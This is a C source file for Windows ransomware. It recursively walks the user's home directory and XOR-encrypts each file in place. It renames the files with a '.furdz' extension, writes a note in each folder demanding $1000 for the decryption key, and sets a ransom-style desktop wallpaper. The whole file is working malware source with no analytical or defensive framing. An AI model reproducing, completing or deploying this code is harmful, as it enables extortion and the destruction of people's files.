#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "libc.h"
#include "entrypoint.h"

#define XOR_KEY(i) ((unsigned char)(0xE3 ^ ((i * 31) & 0xFF)))
#define MAX_PATH_LEN 1024
#define EXTENSION ".furdz"

static const char* ransom_text = "Your files have been encrypted. Pay $1000 to get the decryption key.";
static const char* ransom_filename = "README_RESTORE_FILES.txt";

// -------- PASTE BACKGROUND HERE --------

const unsigned char background_image[] = {
    0xff, 0x00, 0xff, 0x00, 0xff, 0x00, 0x65, 0x00, 0x01, 0x07, 0x01, 0x80, 0x05, 0x00, 0x01, 0x20,
    0x0c, 0x00, 0x01, 0x04, 0x01, 0x40, 0x05, 0x00, 0x01, 0x20, 0x0c, 0x00, 0x01, 0x04, 0x01, 0x47,
    0x01, 0x3c, 0x01, 0x70, 0x01, 0xe3, 0x01, 0xb8, 0x01, 0xe1, 0x01, 0xe0, 0x0c, 0x00, 0x01, 0x04,
    0x01, 0x49, 0x01, 0x32, 0x01, 0x49, 0x01, 0x12, 0x01, 0x49, 0x01, 0x12, 0x01, 0x20, 0x0c, 0x00,
    0x01, 0x07, 0x01, 0x83, 0x01, 0x22, 0x01, 0x61, 0x01, 0x12, 0x01, 0x49, 0x01, 0xf2, 0x01, 0x20,
    0x0c, 0x00, 0x01, 0x04, 0x01, 0xcd, 0x01, 0x22, 0x01, 0x19, 0x01, 0x12, 0x01, 0x49, 0x01, 0x02,
    0x01, 0x20, 0x0c, 0x00, 0x01, 0x04, 0x01, 0x49, 0x01, 0x22, 0x01, 0x49, 0x01, 0x12, 0x01, 0x49,
    0x01, 0x12, 0x01, 0x20, 0x0c, 0x00, 0x01, 0x04, 0x01, 0x4f, 0x01, 0x22, 0x01, 0x78, 0x01, 0xe2,
    0x01, 0x48, 0x01, 0xe1, 0x01, 0xe0, 0xff, 0x00, 0xff, 0x00, 0xff, 0x00, 0x15, 0x00,
};

const unsigned int background_image_len = 142;
const unsigned int image_width = 160;
const unsigned int image_height = 90;

// -----------------------------------------

static void decode_rle(const unsigned char *src, unsigned int src_len,
                       unsigned char *dst, unsigned int dst_len) {
    unsigned int i = 0, j = 0;
    while (i + 1 < src_len && j < dst_len) {
        unsigned char count = src[i++];
        unsigned char value = src[i++];
        for (int k = 0; k < count && j < dst_len; ++k) {
            dst[j++] = value;
        }
    }
}

void set_compressed_wallpaper(void) {
    const char *bmp_path = "C:\\Users\\Public\\t.bmp";
    const int row_bytes = ((image_width + 31) / 32) * 4;  // 1bpp rows are aligned to 4 bytes
    const unsigned int raw_size = row_bytes * image_height;

    // Allocate output buffer for raw bitmap (1bpp)
    unsigned char *raw_data = (unsigned char *)malloc(raw_size);
    if (!raw_data) {
        return;
    }

    // Decode RLE into raw 1-bit bitmap
    memset(raw_data, 0, raw_size);
    decode_rle(background_image, background_image_len, raw_data, raw_size);

    // === BMP HEADER ===
    unsigned int file_size = 14 + 40 + 8 + raw_size;
    unsigned int pixel_offset = 14 + 40 + 8;

    unsigned char header[14 + 40 + 8] = {0};

    // BITMAPFILEHEADER
    header[0] = 'B';
    header[1] = 'M';
    *(unsigned int *)&header[2]  = file_size;
    *(unsigned int *)&header[10] = pixel_offset;

    // BITMAPINFOHEADER
    *(unsigned int *)&header[14] = 40;                  // biSize
    *(int *)&header[18] = image_width;                  // biWidth
    *(int *)&header[22] = -((int)image_height);         // negative = top-down
    *(unsigned short *)&header[26] = 1;                 // biPlanes
    *(unsigned short *)&header[28] = 1;                 // biBitCount
    *(unsigned int *)&header[34] = raw_size;            // biSizeImage

    // 2-color palette: black, white
    header[54] = 0x00; header[55] = 0x00; header[56] = 0x00; header[57] = 0x00;
    header[58] = 0xFF; header[59] = 0xFF; header[60] = 0xFF; header[61] = 0x00;

    // Write BMP
    FILE *f = fopen(bmp_path, "wb");
    if (!f) {
        free(raw_data);
        return;
    }

    fwrite(header, 1, sizeof(header), f);
    fwrite(raw_data, 1, raw_size, f);
    fclose(f);
    free(raw_data);

    // === Set as wallpaper ===
    int res = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)bmp_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
}

// ---------------------

static const char *skipped_path_keywords[] = {
    "\\AppData\\Local",
    // Following is useless for Users dir
    "\\Program Files",
    "\\Windows",
    "\\System32",
    NULL
};

static bool should_skip_directory_path(const char *full_path) {
    for (int i = 0; skipped_path_keywords[i] != NULL; i++) {
        if (strstr(full_path, skipped_path_keywords[i]) != NULL)
            return true;
    }
    return false;
}

// Safe string copy (null-terminated)
static size_t str_copy(char *dst, const char *src, size_t max_len) {
    size_t i = 0;
    while (i + 1 < max_len && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

// Safe string append (null-terminated)
static size_t str_append(char *dst, const char *src, size_t max_len) {
    size_t i = 0;
    while (i < max_len && dst[i]) i++;  // find end of dst

    size_t j = 0;
    while (i + 1 < max_len && src[j]) {
        dst[i++] = src[j++];
    }
    if (i < max_len)
        dst[i] = '\0';

    return i;
}

// Builds: result = dir + "\\" + filename (if provided), or dir + "\\*"
static void concat_path(char *out, size_t max_len, const char *dir, const char *suffix) {
    out[0] = '\0';  // clear output
    str_copy(out, dir, max_len);
    str_append(out, "\\", max_len);
    if (suffix)
        str_append(out, suffix, max_len);
    else
        str_append(out, "*", max_len);
}

static void rename_to_enc(const char *filepath) {
    char newpath[MAX_PATH_LEN];

    // Copie le chemin d'origine
    str_copy(newpath, filepath, MAX_PATH_LEN);

    // Cherche la dernière position du point
    char *last_dot = strrchr(newpath, '.');
    if (last_dot) {
        *last_dot = '\0';  // coupe l'extension
    }

    str_append(newpath, EXTENSION, MAX_PATH_LEN);

    MoveFileA(filepath, newpath);  // rename
}

static bool xor_encrypt_file(const char *filepath) {
    FILE *file = fopen(filepath, "rb+");
    if (!file) return false;

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    if (filesize <= 0) {
        fclose(file);
        return false;
    }

    char *buffer = malloc(filesize);
    if (!buffer) {
        fclose(file);
        return false;
    }

    fread(buffer, 1, filesize, file);
    rewind(file);

    for (long i = 0; i < filesize; i++)
        buffer[i] ^= XOR_KEY(i);

    fwrite(buffer, 1, filesize, file);

    fclose(file);
    free(buffer);
    return true;
}

static void drop_ransom_note(const char *dirpath) {
    char note_path[MAX_PATH_LEN];
    concat_path(note_path, sizeof(note_path), dirpath, ransom_filename);

    FILE *note = fopen(note_path, "w");
    if (note) {
        fputs(ransom_text, note);
        fclose(note);
    }
}

static bool get_user_home_directory(char *buffer, DWORD size) {
    return GetEnvironmentVariableA("USERPROFILE", buffer, size) > 0;
}

static void walk_and_encrypt_directory(const char *dirpath) {
    char search_path[MAX_PATH_LEN];
    concat_path(search_path, sizeof(search_path), dirpath, NULL);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full_path[MAX_PATH_LEN];
        concat_path(full_path, sizeof(full_path), dirpath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (should_skip_directory_path(full_path)) {
                continue;
            }
            walk_and_encrypt_directory(full_path);
            drop_ransom_note(full_path);
        } else {
            if (xor_encrypt_file(full_path)) {
                rename_to_enc(full_path);
            }
        }

    } while (FindNextFileA(hFind, &fd));


    FindClose(hFind);
}

void entrypoint() {
    Sleep(3200);
    char user_home[MAX_PATH_LEN];
    if (get_user_home_directory(user_home, sizeof(user_home))) {
        walk_and_encrypt_directory(user_home);  // C:\Users\<USERNAME> TODO: check if this is the way, maybe all users , Public, etc.
        // Set the wallpaper after encryption
        set_compressed_wallpaper();
    }
}